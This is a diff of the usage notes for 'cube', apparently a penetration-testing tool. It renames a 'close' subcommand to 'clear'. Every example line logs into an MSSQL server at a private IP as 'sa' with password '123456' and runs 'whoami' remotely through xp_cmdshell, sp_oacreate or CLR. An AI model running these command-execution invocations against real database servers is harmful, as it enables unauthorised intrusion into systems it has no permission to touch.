@@ -142,14 +142,14 @@ cube sqlcmd -x ssh://172.16.157.163:2222 -usa -p123456 -e "whoami"
 
 
 cube sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e "whoami"
-cube sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e "close" //close xp_cmdshell
+cube sqlcmd -x mssql://172.16.157.163 -usa -p123456 -e "clear" //clear xp_cmdshell
 
 cube sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e "whoami"
-cube sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e "close" //close sp_oacreate
+cube sqlcmd -x mssql-wscript://172.16.157.163 -usa -p123456 -e "clear" //clear sp_oacreate
 
 
 cube sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e "whoami"
-cube sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e "close" //close sp_oacreate
+cube sqlcmd -x mssql-com://172.16.157.163 -usa -p123456 -e "clear" //clear sp_oacreate
 
 
 cube sqlcmd -x mssql-clr://172.16.157.163 -usa -p123456 -e "whoami"
